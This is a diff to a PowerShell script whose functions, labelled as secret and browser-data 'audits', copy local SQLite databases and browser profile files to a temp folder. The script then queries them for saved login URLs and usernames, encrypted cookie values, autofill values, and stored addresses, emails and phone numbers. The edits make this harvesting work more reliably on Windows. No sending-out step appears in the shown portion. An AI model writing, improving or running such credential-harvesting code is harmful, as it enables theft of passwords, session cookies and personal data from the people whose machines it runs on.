@@ -408,17 +408,15 @@ function check_cloud_secrets {
         $ext = [IO.Path]::GetExtension($f).ToLowerInvariant()
 
         if ($ext -eq '.db') {
-            $sqlite = Get-Command sqlite3 -ErrorAction SilentlyContinue
-            if (-not $sqlite) { $lines.Add("    (sqlite3 not found)"); continue }
             $tmp = [IO.Path]::GetTempFileName()
             try {
                 Copy-Item -LiteralPath $f -Destination $tmp -Force
-                $tables = @(& $sqlite.Source $tmp "SELECT name FROM sqlite_master WHERE type='table';" 2>$null)
+                $tables = @(sqlite_query -Database $tmp -Query "SELECT name FROM sqlite_master WHERE type='table';" 2>$null)
                 if ($tables.Count -eq 0) { $lines.Add("    (no tables)") }
                 foreach ($t in $tables) {
                     if ([string]::IsNullOrWhiteSpace($t)) { continue }
                     $lines.Add("    [$t]")
-                    $rows = @(& $sqlite.Source -separator '|' $tmp "SELECT * FROM [$t] LIMIT 200;" 2>$null)
+                    $rows = @(sqlite_query -Database $tmp -Query "SELECT * FROM [$t] LIMIT 200;" 2>$null)
                     foreach ($row in $rows) { if ($row) { $lines.Add("      $row") } }
                 }
             } catch {
@@ -744,7 +742,6 @@ function get_local_appdata {
 
 function path_to_unix {
     param([string]$Path)
-    if ($script:OS -eq 'windows' -and (have 'cygpath')) { return (& cygpath -u $Path) }
     return $Path
 }
 
@@ -1486,7 +1483,7 @@ function audit_browser_data {
                     }
                 }
 
-                $db = "file:$tmp/db?mode=ro"
+                $db = "file:{0}?mode=ro" -f ((Join-Path $tmp 'db') -replace '\\','/')
                 $sql = @"
 SELECT replace(replace(origin_url, char(9), ' '), char(10), ' '),
        replace(replace(username_value, char(9), ' '), char(10), ' '),
@@ -1549,7 +1546,8 @@ SELECT replace(replace(host_key, char(9), ' '), char(10), ' '),
  WHERE length(encrypted_value) > 3
  LIMIT 500
 "@
-                        $ckRows = @(sqlite_query -Database "file:$tmp/ck?mode=ro" -Query $ckSql 2>$null)
+                        $ckDb = "file:{0}?mode=ro" -f ((Join-Path $tmp 'ck') -replace '\\','/')
+                        $ckRows = @(sqlite_query -Database $ckDb -Query $ckSql 2>$null)
                         foreach ($row in $ckRows) {
                             if ([string]::IsNullOrEmpty($row)) { continue }
                             $parts = $row -split '\|', 3
@@ -1581,7 +1579,7 @@ SELECT replace(replace(host_key, char(9), ' '), char(10), ' '),
                         Copy-Item -LiteralPath $src -Destination (Join-Path $tmp ("wd" + $suffix)) -Force
                     }
                 }
-                $wdDb = "file:$tmp/wd?mode=ro"
+                $wdDb = "file:{0}?mode=ro" -f ((Join-Path $tmp 'wd') -replace '\\','/')
                 $queries = @(
                     @{ Label = 'autofill';  Sql = "SELECT replace(replace(name,char(9),' '),char(10),' ') || '|' || replace(replace(value,char(9),' '),char(10),' ') || '|' || count FROM autofill LIMIT 500" },
                     @{ Label = 'addresses'; Sql = "SELECT company_name, street_address, city, state, zipcode, country_code, phone_number, email_address FROM autofill_profiles LIMIT 200" },
